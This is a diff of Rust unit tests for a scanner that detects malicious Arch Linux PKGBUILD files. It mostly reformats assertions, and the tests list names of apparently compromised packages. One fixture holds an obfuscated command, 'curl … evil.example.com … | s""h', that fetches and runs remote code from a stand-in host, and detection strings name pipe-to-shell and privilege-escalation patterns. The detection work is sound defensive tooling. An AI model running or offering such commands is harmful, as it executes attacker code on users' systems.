@@ -2522,9 +3142,11 @@ package() {
         let src =
             "build() {\n  install -Dm755 \"$srcdir/minifier\" \"$pkgdir/usr/bin/minifier\"\n}\n";
         let findings = scan_pkgbuild_source(src);
-        assert!(findings
-            .iter()
-            .any(|f| f.message.contains("generic build-tool name")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("generic build-tool name"))
+        );
     }
 
     #[test]
@@ -2532,7 +3154,7 @@ package() {
         assert!(is_known_compromised_package("archutil"));
         assert!(is_known_compromised_package("openconnect-sso"));
         assert!(is_known_compromised_package("StorageExplorer-Bin")); // case-insensitive
-                                                                      // Not a substring match - a lookalike/unrelated name must not flag.
+        // Not a substring match - a lookalike/unrelated name must not flag.
         assert!(!is_known_compromised_package("archutil2"));
         assert!(!is_known_compromised_package("my-archutil-fork"));
         assert!(!is_known_compromised_package("firefox"));
@@ -2708,12 +3330,16 @@ post_install() {
         );
 
         let install_findings = scan_pkgbuild_source(install_hook);
-        assert!(install_findings
-            .iter()
-            .any(|f| f.message.contains("atomic-lockfile")));
-        assert!(install_findings
-            .iter()
-            .any(|f| f.severity == Severity::ConfirmedIoc));
+        assert!(
+            install_findings
+                .iter()
+                .any(|f| f.message.contains("atomic-lockfile"))
+        );
+        assert!(
+            install_findings
+                .iter()
+                .any(|f| f.severity == Severity::ConfirmedIoc)
+        );
     }
 
     #[test]
@@ -2731,12 +3357,16 @@ post_install() {
         let findings = scan_pkgbuild_source(src);
         // Hits both the exact-IOC check (AtomicArch) and the generic
         // foreign-package-manager heuristic (Suspicious) on the same line.
-        assert!(findings
-            .iter()
-            .any(|f| f.severity == Severity::ConfirmedIoc && f.line == 2));
-        assert!(findings
-            .iter()
-            .any(|f| f.severity == Severity::Suspicious && f.line == 2));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::ConfirmedIoc && f.line == 2)
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Suspicious && f.line == 2)
+        );
     }
 
     #[test]
@@ -2814,12 +3444,16 @@ build() {
                 .any(|f| f.severity == Severity::ConfirmedIoc
                     && f.message.contains("compromised.txt"))
         );
-        assert!(findings
-            .iter()
-            .any(|f| f.message.contains("paste-dump site")));
-        assert!(findings
-            .iter()
-            .any(|f| f.message.contains("curl/wget | sh")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("paste-dump site"))
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("curl/wget | sh"))
+        );
     }
 
     // ── Jul/Aug 2026 openconnect-sso-anchored wave ──────────────────────
@@ -2891,9 +3525,12 @@ build() {
 }
 "#;
         let findings = scan_pkgbuild_source(pkgbuild);
-        assert!(findings
-            .iter()
-            .any(|f| f.severity == Severity::Suspicious && f.message.contains("sudo/pkexec/doas")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.severity == Severity::Suspicious
+                    && f.message.contains("sudo/pkexec/doas"))
+        );
     }
 
     // ── absolute-path / env-wrapped shell in curl|sh (gap fix) ──────────
@@ -3061,8 +3698,10 @@ build() {
         // still catches it.
         let src = "curl -sSL https://evil.example.com/x | s\"\"h\n";
         let findings = scan_pkgbuild_source(src);
-        assert!(findings
-            .iter()
-            .any(|f| f.message.contains("curl/wget | sh")));
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("curl/wget | sh"))
+        );
     }
 }
